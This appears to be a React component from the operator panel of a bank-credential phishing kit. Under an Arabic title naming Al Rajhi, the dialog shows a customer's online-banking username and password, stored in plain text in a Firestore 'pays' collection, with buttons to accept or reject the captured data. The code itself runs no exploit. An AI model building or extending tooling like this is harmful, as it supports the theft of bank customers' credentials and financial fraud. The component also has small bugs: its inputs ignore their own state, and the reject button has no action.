"use client";

import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CreditCard, Lock, User } from "lucide-react";
import { doc, updateDoc } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { toast } from "sonner";

interface RajhiAuthDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  notification: any;
}

export default function RajhiAuthDialog({
  open,
  onOpenChange,
  notification,
}: RajhiAuthDialogProps) {
  const [username, setUsername] = useState(
    notification?.externalUsername || ""
  );
  const [password, setPassword] = useState(
    notification?.externalPassword || ""
  );
  const [autnAttachment, setAutnAttachment] = useState(
    notification?.autnAttachment || ""
  );
  const [requierdAttachment, setRequierdAttachment] = useState(
    notification?.requierdAttachment || ""
  );
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSave = async () => {
    if (!notification?.id) return;

    setIsSubmitting(true);
    try {
      const docRef = doc(db, "pays", notification.id);
      await updateDoc(docRef, {
        externalUsername: username,
        externalPassword: password,
        autnAttachment: autnAttachment,
        requierdAttachment: requierdAttachment,
      });

      toast.success("تم حفظ بيانات الراجحي بنجاح", {
        position: "top-center",
        duration: 3000,
      });
      onOpenChange(false);
    } catch (error) {
      console.error("Error updating Rajhi credentials:", error);
      toast.error("حدث خطأ أثناء حفظ البيانات", {
        position: "top-center",
        duration: 3000,
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
        dir="rtl"
      >
        <DialogHeader className="border-b pb-3">
          <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
            بيانات تسجيل الدخول للراجحي
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-4 py-3">
          <div className="p-4 rounded-lg bg-gradient-to-r from-green-500 to-green-600 text-white shadow-lg">
            <div className="flex justify-between items-start mb-4">
              <div className="flex flex-col">
                <span className="text-sm text-green-100 mb-1">
                  معلومات المستخدم
                </span>
                <span className="font-medium">الراجحي</span>
              </div>
              <CreditCard className="h-8 w-8 text-white opacity-80" />
            </div>
          </div>

          <div className="space-y-4">
            <div className="grid gap-2">
              <Label htmlFor="username" className="text-right">
                اسم المستخدم
              </Label>
              <div className="relative">
                <User className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="username"
                  value={notification?.externalUsername}
                  onChange={(e) => setUsername(e.target.value)}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="password" className="text-right">
                كلمة المرور
              </Label>
              <div className="relative">
                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="password"
                  readOnly
                  value={notification?.externalPassword}
                  onChange={(e) => setPassword(e.target.value)}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>
          </div>
        </div>

        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
          <Button
            onClick={handleSave}
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
          >
            {isSubmitting ? "جاري الحفظ..." : "ثبول البيانات"}
          </Button>{" "}
          <Button
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-0 shadow-md"
          >
            {isSubmitting ? "جاري الحفظ..." : "رفض"}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
